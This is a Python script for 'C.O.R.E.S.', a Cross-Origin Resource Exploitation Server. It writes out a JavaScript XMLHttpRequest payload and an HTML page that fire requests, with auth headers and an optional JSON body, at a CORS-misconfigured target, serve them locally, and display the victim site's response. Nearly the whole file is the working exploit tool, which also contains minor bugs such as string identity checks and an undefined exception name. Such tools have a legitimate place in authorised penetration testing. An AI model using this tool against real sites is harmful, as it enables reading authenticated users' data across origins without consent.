#!/usr/bin/env python3
"""
C.O.R.E.S
Cross-Origin Resource Exploitation Server
Orig: Nick Sanzotta/@Beamr v1.03312017
Updated: Bill Harshbarger v1.05222019
"""

import argparse
import http.server
import json
import os
import socket
import socketserver
from urllib.parse import urlparse
import webbrowser

class Cores(object):
    """cores object"""

    def __init__(self, autolaunch_browser, rqhdr, method, port, url, payload, verbose):
        """inits values"""

        self.url = url
        self.host = urlparse(self.url)[1]
        self.method = ''.join(method).upper()
        self.port = port
        self.internal_ip = None
        self.html_name = 'index.html'
        self.autolaunch_browser = False
        self.rqhdr = ','.join(rqhdr)
        self.verbose = verbose

        if self.port is not None:
            self.port = port

        #this is messed up and only eats one header value properly
        self.header_key = self.rqhdr.split(':')[0]
        self.header_val = self.rqhdr.split(':')[1]
        
        self.payload = None
        self.content_type = ''
        self.post_content_type = None

        #generic content type for get requests
        if self.method is 'GET':
            self.content_type = "'Content-Type','application/octet-stream'"
        
        #Need to specify 
        if self.method is 'POST':
            if payload is not None:
                self.payload = ''.join(payload)
                self.content_type = "'Content-Type','application/json;charset=UTF-8'"

        if self.verbose is True:
            #add verbosity flag for this
            print('\n******************\n\nC.O.R.E.S.: Cross Origin Resource Exploitation Server\n')
            print('See https://en.wikipedia.org/wiki/Cross-origin_resource_sharing\n')
            print('Request infomration:')
            print('\n\nURL : {}\n\nHOST : {}\n\nMETHOD : {}\n\nHEADER_KEY :{}\n\nHEADER_VAL : {}\n\nPAYLOAD : {}\n\n'.format(self.url, self.host, self.method, self.header_key, self.header_val, self.payload))
            print('Original concept and code: Nick Sanzotta/@beamr. Ported to Python3 by Bill Harshbarger v1.05222019')

    def dir_check(self):
        ''' If specified directory does not exist then create specified directory '''
        if not os.path.exists('./js'):
            os.makedirs('./js')

    def get_internal_address(self):
        """use socket to try to connect to 8.8.8.8 on tcp/53, return getsockname as internal_ip"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect(("8.8.8.8", 53))
            self.internal_ip = sock.getsockname()[0]
            return self.internal_ip
        except msg:
            print(msg)

    def browser_launch(self):
        ''' Auto Launches Default Browser '''
        try:
            url = str("http://localhost:{}/index.html".format(self.port))
            webbrowser.open(url)
        except webbrowser.Error as e:
            print("Browser not found!{}".format(e))

    def javascript_template(self):
        ''' 0. The commented code is javascript, not python, dont forget to double curly braces if not being used for string formatting
            1. Create CORS template for JavaScript Payload
            2. Write CORS template to file 
            https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText'''
        filename = './js/cors.js'
        javascript_template = """var xhr = new XMLHttpRequest();
//generally in this section you may need to set some staic values, especially for headers
//to do this view valid requests in burp to see which ones are required
//passes in 'method', 'url', true
xhr.open('{}','{}', true); 

//headers...you may need to/want to statically set these for your app

//set host header
xhr.setRequestHeader('Host','{}');

//sets auth header as 'key','val'
xhr.setRequestHeader('{}','{}');

//header example
//xhr.setRequestHeader('key','val');

//response type. maybe can be empty quotes?
//xhr.responseType = '';

//set content type for POST, trying to conditionally do this
//xhr.setRequestHeader('{}');
xhr.setRequestHeader('Content-Type','application/json');



//attempts to echo response to browser or log
xhr.onload = function () {{
    if (xhr.readyState === xhr.DONE){{
        console.log(xhr.response);
        console.log(xhr.responseText);
        window.alert(this.responseText);

    }}
}};

//send JSON payload
xhr.send(JSON.stringify({}));

//pop up alerts? bills experiments 
//window.alert(xhr.response);
//window.alert(xhr.responseText);
//document.write(xhr.responseText);

"""
        cors_js = javascript_template.format(self.method, self.url, self.host, self.header_key, self.header_val, self.content_type, self.payload)
        with open(filename, 'w+') as f:
            f.write(cors_js)
            return cors_js

    def html_template(self):
        ''' 1. Create HTML template for index.html
            2. Write index.html to file '''
        filename = './index.html'
        html_template = """<!DOCTYPE HTML>
<html lang="en-US">
<title>C.O.R.E.S</title>
<head></head>
<body>
<p style="margin-left: 55px">
<b>Cross-Origin Resource Exploitation Server</b><br>
C.O.R.E.S.<br>
<p style="margin-left: 55px">
<b>Logs: Check your browser's console log</b></p>
<p style="margin-left: 55px", id="loot"></p>
<script src="/js/cors.js"></script>
</body>
</html>"""

        with open(filename, 'w+') as f:
            f.write(html_template)
        return html_template


    def append_refresh(self):
        foo=None

    def server_start(self):
        '''Starts Python3's http.server'''
        Handler = http.server.SimpleHTTPRequestHandler

        with socketserver.TCPServer(("0.0.0.0", self.port), Handler) as httpd:
            print("\nC.O.R.E.S. serving on port {} \n".format(self.port))
            httpd.serve_forever()

def main():
    """main function handles argument processing and sigint handling"""

    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--autolaunch_browser', \
        help='Auto launches a browser', \
        action='store_true')
    parser.add_argument('-l', '--payload',\
        help='payload to POST')
    parser.add_argument('-m', '--method', \
        metavar='get, post, etc.', \
        help='Define HTTP request method ex: -m post', \
        choices=['get', 'patch', 'post', 'put', 'delete', 'head', 'trace'], \
        nargs=1, \
        required=True)
    parser.add_argument('-p', '--port', \
        metavar='8080',\
        help='Port to start local HTTP server on. Default is 8080', \
        type=int)
    parser.add_argument('-r', '--rqhdr', \
        type=str, \
        nargs=1, \
        help='Specify optional header(s) for authentication, JWT, i.e. Authorization: Bearer eyJhbGciOiJSUz... yadda yadda')
    parser.add_argument('-u', '--url', \
        metavar='http://foo.com', \
        required=True, help='Define vulnerable CORS targert URL ex: https://site.com/')
    parser.add_argument('-v', '--verbose', \
        help='Enable verbosity', \
        action='store_true')

    args = parser.parse_args()

    runcores = Cores(args.autolaunch_browser, args.rqhdr, args.method, args.port, args.url, args.payload, args.verbose)
    runcores.dir_check()
    runcores.get_internal_address()
    runcores.javascript_template()
    runcores.html_template()
    if args.autolaunch_browser is True:
        runcores.browser_launch()
  

    #start the CORES server
    runcores.server_start()

if __name__ == '__main__':
    main()
